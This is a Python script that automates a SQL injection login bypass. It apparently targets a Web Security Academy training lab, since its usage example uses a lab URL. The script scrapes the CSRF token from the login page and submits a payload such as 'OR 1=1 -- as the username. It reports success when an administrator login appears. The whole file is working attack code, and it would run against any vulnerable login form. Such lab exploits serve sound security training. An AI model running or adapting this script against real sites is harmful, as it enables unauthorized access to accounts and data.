#!/usr/bin/env python3

import requests
import sys
import urllib3
from bs4 import BeautifulSoup

# Disable SSL warnings for non-SSL connections
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Function to fetch the CSRF token from the login page
def get_csrf_token(session, url, proxies):
    try:
        # Sending a GET request to the login page to retrieve the CSRF token
        login_uri = '/login'
        response = session.get(url + login_uri, verify=False, proxies=proxies)

        # Parse the HTML response to find the CSRF token
        soup = BeautifulSoup(response.text, 'html.parser')
        csrf = soup.find("input", {"name": "csrf"})['value']

        return csrf

    except Exception as e:
        print(f"[-] Failed to retrieve CSRF token: {e}")
        sys.exit(-1)

# Function to exploit SQL Injection by attempting login with a malicious payload
def exploit_sqli(session, url, payload, proxies):
    # Fetch CSRF token for the POST request
    csrf_token = get_csrf_token(session, url, proxies)

    # Data to be sent with the POST request
    data = {
        "csrf": csrf_token,
        "username": payload,
        "password": "randompassword"
    }

    # POST request to submit the login form
    response = session.post(url + '/login', data=data, verify=False, proxies=proxies)
    
    # Check if SQL injection was successful (by looking for a specific success indicator)
    if "Your username is: administrator" in response.text:
        return True
    else:
        return False

if __name__ == "__main__":
    try:
        # Get URL and payload from command-line arguments
        url = sys.argv[1].strip()  # Target URL
        payload = sys.argv[2].strip()  # SQL injection payload

        # Initialize proxy as None unless specified via '-x' argument
        proxies = None

        # Check if proxy argument '-x' is provided
        if '-x' in sys.argv:
            proxy_index = sys.argv.index('-x') + 1
            proxy = sys.argv[proxy_index].strip()
            # Set up HTTP and HTTPS proxies
            proxies = {'http': proxy, 'https': proxy}

        # Create a session object for handling multiple requests
        session = requests.Session()

    except IndexError:
        # Print usage information if arguments are missing
        print(f"[-] Usage: {sys.argv[0]} <url> <payload> [-x <proxy>]")
        print(f"[-] Example: {sys.argv[0]} https://0a72000b03fc80ea8bc0de2b003c00ca.web-security-academy.net \"'OR 1=1 --\"")
        sys.exit(-1)

    # Execute the SQL injection attempt and print the result
    if exploit_sqli(session, url, payload, proxies):
        # Print success message (green)
        print("\033[92m[+] SQL injected successfully :) \033[0m")
    else:
        # Print failure message (red)
        print("\033[91m[-] SQL injection failed :( \033[0m")
